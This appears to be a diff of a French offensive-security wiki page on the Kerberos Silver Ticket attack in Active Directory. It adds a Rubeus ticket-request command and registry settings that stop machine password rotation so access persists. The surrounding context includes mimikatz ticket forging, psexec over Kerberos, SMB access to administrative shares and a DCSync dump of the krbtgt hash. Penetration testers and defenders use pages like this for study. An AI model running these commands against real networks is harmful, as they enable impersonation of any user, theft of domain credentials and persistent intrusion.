@@ -6,9 +6,13 @@
 
 ## Silver ticket
 
-L'attaque **Silver Ticket** implique l'exploitation des tickets de service dans les environnements Active Directory (AD). Cette méthode repose sur **l'acquisition du hachage NTLM d'un compte de service**, tel qu'un compte d'ordinateur, pour forger un ticket de service de ticket granting (TGS). Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques sur le réseau, **usurpant n'importe quel utilisateur**, visant généralement des privilèges administratifs. Il est souligné que l'utilisation de clés AES pour forger des tickets est plus sécurisée et moins détectable.
+L'attaque **Silver Ticket** implique l'exploitation des tickets de service dans les environnements Active Directory (AD). Cette méthode repose sur **l'acquisition du hash NTLM d'un compte de service**, tel qu'un compte d'ordinateur, pour forger un ticket de Service de Délivrance de Tickets (TGS). Avec ce ticket forgé, un attaquant peut accéder à des services spécifiques sur le réseau, **usurpant n'importe quel utilisateur**, visant généralement des privilèges administratifs. Il est souligné que l'utilisation de clés AES pour forger des tickets est plus sécurisée et moins détectable.
 
-Pour la création de tickets, différents outils sont utilisés en fonction du système d'exploitation :
+> [!WARNING]
+> Les Silver Tickets sont moins détectables que les Golden Tickets car ils ne nécessitent que le **hash du compte de service**, et non le compte krbtgt. Cependant, ils sont limités au service spécifique qu'ils ciblent. De plus, il suffit de voler le mot de passe d'un utilisateur.
+De plus, si vous compromettez le **mot de passe d'un compte avec un SPN**, vous pouvez utiliser ce mot de passe pour créer un Silver Ticket usurpant n'importe quel utilisateur pour ce service.
+
+Pour le crafting de tickets, différents outils sont utilisés en fonction du système d'exploitation :
 
 ### On Linux
 ```bash
@@ -18,6 +22,11 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
 ### Sur Windows
 ```bash
+# Using Rubeus
+## /ldap option is used to get domain data automatically
+## With /ptt we already load the tickt in memory
+rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
 
@@ -32,26 +41,30 @@ Le service CIFS est mis en avant comme une cible courante pour accéder au syst�
 
 ## Services Disponibles
 
-| Type de Service                            | Tickets Argent Service                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
+| Type de Service                            | Tickets Argent disponibles                                                |
+| ------------------------------------------ | ------------------------------------------------------------------------ |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Selon le système d'exploitation également :</p><p>WSMAN</p><p>RPCSS</p> |
 | WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certaines occasions, vous pouvez simplement demander : WINRM</p> |
-| Tâches Planifiées                          | HOST                                                                       |
-| Partage de Fichiers Windows, aussi psexec | CIFS                                                                       |
-| Opérations LDAP, y compris DCSync         | LDAP                                                                       |
-| Outils d'Administration de Serveur à Distance Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Tickets en Or                              | krbtgt                                                                     |
+| Tâches Planifiées                         | HOST                                                                   |
+| Partage de Fichiers Windows, également psexec | CIFS                                                                   |
+| Opérations LDAP, y compris DCSync        | LDAP                                                                   |
+| Outils d'Administration de Serveur à Distance Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                   |
+| Tickets en Or                              | krbtgt                                                                 |
 
 En utilisant **Rubeus**, vous pouvez **demander tous** ces tickets en utilisant le paramètre :
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Identifiants d'Événements des Tickets Argent
+### IDs d'Événements des Tickets Argent
 
 - 4624 : Connexion de Compte
 - 4634 : Déconnexion de Compte
 - 4672 : Connexion Administrateur
+
+## Persistance
+
+Pour éviter que les machines ne changent leur mot de passe tous les 30 jours, définissez `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou vous pouvez définir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` à une valeur supérieure à 30 jours pour indiquer la période de rotation lorsque le mot de passe de la machine doit être changé.
 
 ## Abus des Tickets de Service
 
@@ -59,7 +72,7 @@ Dans les exemples suivants, imaginons que le ticket est récupéré en usurpant 
 
 ### CIFS
 
-Avec ce ticket, vous pourrez accéder au dossier `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant juste en faisant quelque chose comme :
+Avec ce ticket, vous pourrez accéder aux dossiers `C$` et `ADMIN$` via **SMB** (s'ils sont exposés) et copier des fichiers vers une partie du système de fichiers distant en faisant simplement quelque chose comme :
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
@@ -124,16 +137,18 @@ Avec ce privilège, vous pouvez extraire la base de données DC en utilisant **D
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**En savoir plus sur DCSync** sur la page suivante :
+**En savoir plus sur DCSync** dans la page suivante :
+
+{{#ref}}
+dcsync.md
+{{#endref}}
+
 
 ## Références
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-
-{{#ref}}
-dcsync.md
-{{#endref}}
+- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
 
 
 
